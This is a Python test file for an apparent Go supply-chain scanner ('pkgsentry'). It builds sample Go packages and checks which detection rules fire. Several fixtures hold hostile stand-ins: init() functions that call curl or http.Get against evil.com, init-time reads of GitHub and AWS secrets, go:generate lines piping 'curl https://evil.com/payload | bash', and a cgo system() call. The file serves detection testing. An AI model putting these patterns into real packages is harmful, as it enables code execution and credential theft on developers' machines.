# SPDX-License-Identifier: AGPL-3.0-or-later
from __future__ import annotations

import tempfile
from pathlib import Path

from pkgsentry.ecosystems.gomod.go_directives import analyze_go_directives


def _make_tree(files: dict[str, str]) -> Path:
    tmp = Path(tempfile.mkdtemp())
    for name, content in files.items():
        p = tmp / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
    return tmp


def test_init_exec_chain():
    root = _make_tree({
        "main.go": 'package main\n\nimport (\n\t"os/exec"\n)\n\nfunc init() {\n\texec.Command("curl", "https://evil.com").Run()\n}\n',
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.init_exec_chain" in rule_ids


def test_init_exec_not_in_init():
    """Regression: modernc.org/cc/v5 false positive — init() empty, exec in another func."""
    root = _make_tree({
        "cc.go": (
            'package cc\n\n'
            'import (\n\t"os/exec"\n)\n\n'
            'func init() {}\n\n'
            'func NewConfig() {\n\tcmd := exec.Command("cc")\n\tcmd.Run()\n}\n'
        ),
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.init_exec_chain" not in rule_ids
    assert "gomod.init_exec_coexist" in rule_ids


def test_init_exec_coexist_indirect():
    """Indirect call: init() calls helper that uses exec — fallback fires, primary doesn't."""
    root = _make_tree({
        "main.go": (
            'package main\n\n'
            'import "os/exec"\n\n'
            'func init() {\n\tdoEvil()\n}\n\n'
            'func doEvil() {\n\texec.Command("curl", "evil.com").Run()\n}\n'
        ),
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.init_exec_chain" not in rule_ids
    assert "gomod.init_exec_coexist" in rule_ids


def test_init_net_chain():
    root = _make_tree({
        "main.go": 'package main\n\nimport (\n\t"net/http"\n)\n\nfunc init() {\n\thttp.Get("https://evil.com/beacon")\n}\n',
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.init_net_chain" in rule_ids


def test_init_net_not_in_init():
    """init() empty, http calls in another function — should NOT fire."""
    root = _make_tree({
        "client.go": (
            'package client\n\n'
            'import "net/http"\n\n'
            'func init() {}\n\n'
            'func Fetch(url string) {\n\thttp.Get(url)\n}\n'
        ),
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.init_net_chain" not in rule_ids


def test_init_env_harvest():
    root = _make_tree({
        "main.go": 'package main\n\nimport "os"\n\nfunc init() {\n\tos.Getenv("GITHUB_TOKEN")\n\tos.Getenv("AWS_SECRET_ACCESS_KEY")\n\tos.Getenv("PRIVATE_KEY")\n}\n',
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.init_env_harvest" in rule_ids


def test_init_env_not_in_init():
    """Env reads outside init() — should NOT fire init_env_harvest."""
    root = _make_tree({
        "config.go": (
            'package config\n\n'
            'import "os"\n\n'
            'func init() {}\n\n'
            'func LoadConfig() {\n'
            '\tos.Getenv("GITHUB_TOKEN")\n'
            '\tos.Getenv("AWS_SECRET_ACCESS_KEY")\n'
            '\tos.Getenv("PRIVATE_KEY")\n'
            '}\n'
        ),
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.init_env_harvest" not in rule_ids


def test_go_generate_exec():
    root = _make_tree({
        "gen.go": 'package main\n\n//go:generate bash -c "curl https://evil.com | sh"\n\nfunc Foo() {}\n',
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.go_generate_exec" in rule_ids


def test_go_generate_sh_wrapping_benign():
    """sh -c 'go tool mockgen ...' is benign — should NOT fire go_generate_exec."""
    root = _make_tree({
        "mockgen.go": (
            'package main\n\n'
            '//go:generate sh -c "go tool mockgen -typed -package mocks -destination foo.go example.com/pkg Iface"\n\n'
            'func Foo() {}\n'
        ),
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.go_generate_exec" not in rule_ids


def test_go_generate_sh_wrapping_dangerous():
    """sh -c 'curl ...' is still dangerous."""
    root = _make_tree({
        "gen.go": 'package main\n\n//go:generate sh -c "curl https://evil.com/payload | bash"\n\nfunc Foo() {}\n',
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.go_generate_exec" in rule_ids


def test_go_generate_no_word_boundary_fp():
    """Regression: 'nc' in regex must not match inside 'parseDependency'."""
    root = _make_tree({
        "gen.go": 'package main\n\n//go:generate swag init --parseDependency --parseDepth=6\n\nfunc Foo() {}\n',
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.go_generate_exec" not in rule_ids


def test_go_generate_benign_whitelisted():
    """Known-benign tools (stringer, mockgen, etc.) produce no finding."""
    root = _make_tree({
        "gen.go": "package main\n\n//go:generate stringer -type=Foo\n\nfunc Foo() {}\n",
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.go_generate" not in rule_ids
    assert "gomod.go_generate_exec" not in rule_ids


def test_go_generate_unknown_tool():
    """Unrecognized go:generate tool emits low-severity finding."""
    root = _make_tree({
        "gen.go": "package main\n\n//go:generate mytool --flag=val\n\nfunc Foo() {}\n",
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.go_generate" in rule_ids
    assert findings[0].severity == "low"
    assert "gomod.go_generate_exec" not in rule_ids


def test_cgo_import():
    root = _make_tree({
        "cgo.go": 'package main\n\n// #include <stdio.h>\nimport "C"\n\nfunc main() {}\n',
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.cgo_import" in rule_ids


def test_cgo_exec_chain():
    root = _make_tree({
        "cgo.go": 'package main\n\n/*\n#include <stdlib.h>\nvoid run() { system("curl https://evil.com"); }\n*/\nimport "C"\n\nfunc main() { C.run() }\n',
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.cgo_exec_chain" in rule_ids


def test_unsafe_import():
    root = _make_tree({
        "main.go": 'package main\n\nimport "unsafe"\n\nfunc main() {\n\t_ = unsafe.Pointer(nil)\n}\n',
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.unsafe_import" in rule_ids


def test_replace_directive():
    root = _make_tree({
        "go.mod": "module example.com/foo\n\ngo 1.21\n\nreplace github.com/legit/lib => github.com/evil/fork v0.0.1\n",
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.replace_directive" in rule_ids


def test_replace_local_path():
    root = _make_tree({
        "go.mod": "module example.com/foo\n\ngo 1.21\n\nreplace golang.org/x/crypto => ./local-crypto\n",
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.replace_local_path" in rule_ids


def test_clean_module_no_findings():
    root = _make_tree({
        "main.go": 'package main\n\nimport "fmt"\n\nfunc main() {\n\tfmt.Println("hello")\n}\n',
        "go.mod": "module example.com/hello\n\ngo 1.21\n",
    })
    findings = analyze_go_directives(root)
    assert len(findings) == 0


def test_encoded_payload():
    payload = "A" * 250
    root = _make_tree({
        "main.go": f'package main\n\nvar data = "{payload}"\n',
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.encoded_payload" in rule_ids


def test_test_file_skips_init_rules():
    """_test.go files skip init() rules — test init() doesn't auto-execute on import."""
    root = _make_tree({
        "pebble_test.go": (
            'package acme\n\n'
            'import "os/exec"\n\n'
            'func init() {\n\texec.Command("pebble").Run()\n}\n'
        ),
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.init_exec_chain" not in rule_ids
    assert "gomod.init_exec_coexist" not in rule_ids


def test_test_file_skips_encoded_payload():
    """_test.go files skip encoded_payload — crypto test vectors are normal."""
    payload = "A" * 250
    root = _make_tree({
        "keys_test.go": f'package openpgp\n\nvar testKey = "{payload}"\n',
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.encoded_payload" not in rule_ids


def test_test_file_keeps_go_generate_rules():
    """_test.go files still check go:generate — those directives are ecosystem-agnostic."""
    root = _make_tree({
        "gen_test.go": 'package main\n\n//go:generate curl https://evil.com\n\nfunc TestFoo() {}\n',
    })
    findings = analyze_go_directives(root)
    rule_ids = [f.rule_id for f in findings]
    assert "gomod.go_generate_exec" in rule_ids


def test_changed_files_filter():
    """Only analyze files in changed_files set."""
    root = _make_tree({
        "evil.go": 'package main\n\nimport "os/exec"\n\nfunc init() {\n\texec.Command("curl", "evil.com").Run()\n}\n',
        "safe.go": 'package main\n\nimport "fmt"\n\nfunc main() { fmt.Println("ok") }\n',
    })
    # With filter excluding evil.go — no findings
    findings = analyze_go_directives(root, changed_files={"safe.go"})
    assert len(findings) == 0
    # With filter including evil.go — finding fires
    findings = analyze_go_directives(root, changed_files={"evil.go"})
    assert any(f.rule_id == "gomod.init_exec_chain" for f in findings)
